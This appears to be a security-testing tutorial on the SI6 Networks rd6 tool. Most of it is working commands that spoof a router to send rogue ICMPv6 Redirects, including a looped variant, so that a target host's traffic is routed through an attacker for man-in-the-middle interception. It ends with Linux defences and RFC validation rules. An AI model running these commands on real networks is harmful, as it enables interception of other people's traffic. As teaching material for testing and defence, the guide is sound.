# How to Use the SI6 Networks rd6 Tool for Redirect Attacks

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: SI6 Networks, rd6, IPv6, Redirect, NDP, Security Testing

Description: A guide to using the SI6 Networks rd6 tool to test ICMPv6 Redirect message handling and traffic redirection vulnerabilities in authorized lab environments.

The `rd6` tool from the SI6 Networks IPv6 toolkit crafts ICMPv6 Redirect messages (Type 137). In IPv6, routers send Redirect messages to inform hosts of a better next-hop for a particular destination. A rogue Redirect can redirect a host's traffic to an attacker-controlled address, enabling man-in-the-middle attacks. `rd6` tests whether hosts properly validate Redirect messages.

**Warning**: Only use in authorized lab environments. Sending rogue Redirects on production networks is illegal and disruptive.

## Understanding ICMPv6 Redirects

```
Normal flow:         Host A → Router → Destination
After rogue redirect: Host A → Attacker → Destination (MITM)
```

A Redirect tells Host A: "For destination X, use next-hop Y instead of me." If Y is the attacker's address, all traffic to X passes through the attacker.

## Installing the SI6 Networks Toolkit

```bash
sudo apt-get install ipv6toolkit   # Debian/Ubuntu
sudo pacman -S ipv6toolkit          # Arch Linux
```

## Basic rd6 Usage

```bash
# Send a basic ICMPv6 Redirect message
sudo rd6 -i eth0

# Redirect traffic from target to attacker
sudo rd6 -i eth0 \
  -s fe80::router \        # Must appear to come from the current router
  -d 2001:db8::target \    # Host to redirect
  --redir-dest 2001:db8::server \   # The destination being redirected
  --redir-addr 2001:db8::attacker   # The new next-hop (attacker)
```

## Key rd6 Parameters

```bash
# -s: Source address (should be the legitimate router's link-local)
# -d: Destination (the host to redirect)
# --redir-dest: The destination address being redirected
# --redir-addr: The new next-hop address (where to send traffic)

# Example: Redirect Host A's traffic to example.com through attacker
sudo rd6 -i eth0 \
  -s fe80::1 \                      # Spoof router's link-local
  -d fe80::host-a \                  # Target host
  --redir-dest 2001:db8::server \   # Destination to redirect
  --redir-addr fe80::attacker        # New next-hop
```

## Redirect with Redirected Header Option

ICMPv6 Redirects can include part of the original packet (Redirected Header option), which makes them appear more legitimate:

```bash
# Include redirected header (increases perceived legitimacy)
sudo rd6 -i eth0 \
  -s fe80::router \
  -d fe80::target \
  --redir-dest 2001:db8::server \
  --redir-addr fe80::attacker \
  --redir-hdr
```

## Continuous Redirect Attack

Redirect entries in the routing table may timeout; continuous sending maintains the redirection:

```bash
# Send Redirect every 30 seconds
sudo rd6 -i eth0 \
  -s fe80::router \
  -d fe80::target \
  --redir-dest 2001:db8::server \
  --redir-addr fe80::attacker \
  --loop --sleep 30
```

## Verifying Redirect Effect

On the target host, check the routing table:

```bash
# Check if redirect was accepted
ip -6 route show cache

# Look for routes with "cache" and "redirect" flags
# Redirects appear as host routes in the route cache

# Remove redirect from cache (revert)
ip -6 route flush cache
```

## Validating Redirect Security

RFC 4861 specifies validation rules for Redirect acceptance:

1. Source address must be the current first-hop router for the destination
2. Destination must be a neighbor (on-link)
3. Redirect must not be from an off-link source

```bash
# Test if your host incorrectly accepts redirects from non-routers
sudo rd6 -i eth0 \
  -s 2001:db8::non-router \   # Not a router source
  -d 2001:db8::target \
  --redir-dest 2001:db8::server \
  --redir-addr 2001:db8::attacker
# A properly configured host should ignore this
```

## Defenses Against Rogue Redirects

```bash
# Disable ICMPv6 Redirect acceptance on Linux
sudo sysctl -w net.ipv6.conf.eth0.accept_redirects=0

# Make persistent
echo "net.ipv6.conf.all.accept_redirects = 0" >> /etc/sysctl.conf
echo "net.ipv6.conf.default.accept_redirects = 0" >> /etc/sysctl.conf
sudo sysctl -p
```

| Defense | Effect |
|---|---|
| `accept_redirects=0` | Host ignores all ICMPv6 Redirects |
| SEND (RFC 3971) | Cryptographically validates NDP messages |
| Stateful firewalls | Can filter unexpected Redirect sources |
| NDPMon | Alerts on unexpected Redirect messages |

Disabling `accept_redirects` is the most practical defense for servers and sensitive hosts. Client machines may need it enabled for legitimate network topology optimization, so the tradeoff must be evaluated per environment.
